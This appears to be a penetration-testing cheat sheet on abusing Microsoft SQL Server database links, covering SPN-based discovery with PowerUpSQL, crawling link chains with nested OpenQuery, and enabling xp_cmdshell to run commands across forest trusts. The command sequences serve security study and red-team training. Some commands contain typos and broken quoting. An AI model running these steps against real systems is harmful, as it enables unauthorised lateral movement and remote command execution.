---
description: Database Links
---

# Database Links

> We can move across forest boundary without having to take care of anything at all. We will abuse those links to execute commands across forest trusts.

A Database Link allows a SQL Server access external data sources (OLEDb...). When a DBLink is created, we can specift the credentials to create that dblink. This means we may have a long chain of dblinks, where initially having 0 privs to any sysadmin/interesting priv.

***

### 1. MSSQL SPN Scanning (Discovery)

Check SQL servers of current domain:

```bash
#PowerUpSQL:
Get-SQLInstanceDomain #Output provides list of all sQL servers which have an SPN registered with the DC. The only check is that the SPN name starts with "MSSQL...".
```

### 2. Check which ones are accessible

Check which ones of the previous output are accessible:

```bash
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```

### 3. Get info about the DBLinks (accessible ones)

```bash
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

***

### Searching DBLinks

#### 1. Look for links to remote servers

```bash
#Using PowerUpSQL:
Get-SQLServerLink -Instance $INSTANCE_NAME -Verbose #Check DatabaseLinkName and DatabaseLinkLocation (remote is the one we look for)

#Manual with Heidy:
select * from master..sysservers #Mark "Use windows auth"
```

#### 2. Enumerate DBLinks (chains)

We use OpenQuery() function to return queries on a linked database:

```bash
#Manual:
select * from openquery("$INSTANCE_NAME1",'select * from master..sysservers') #See dblinks chain on the first dblink we have

select * from openquery("$INSTANCE_NAME1",'select * from openquery("$INSTANCE_NAME2",''select * from master..sysservers'')') #Single quotes multiply by 2: 1,2,4,8,16... on every hop

#Using PowerUpSQL:
Get-SQLServerLinkCrawl -Instace $INSTANCE_NAME -Verbose #Instance name is the first instance we have access to
```

#### 3. Executing commands

Considerations:

* xp\_cmdshell should be already enabled or
* rpcout is enabled (disabled by default) we can enable xp\_cmdshell:

```bash
EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;')
```

Exec code when xp\_cmdshell is enabled:

```bash
#PowerUPSql:
Get-SQLServerLinkCrawl -Instance $INSTACE_NAME1 -Query "exec master..xp_cmdshell 'whoami'"

#Manual:
select * from openquery("$INSTANCE_NAME1",'select * from openquery("$INSTANCE_NAME2",''select * from openquery("$INSTANCE_NAME3",''''select @@version as version;exec master..xp_cmdshell "powershell whoami)'''')'')')
```
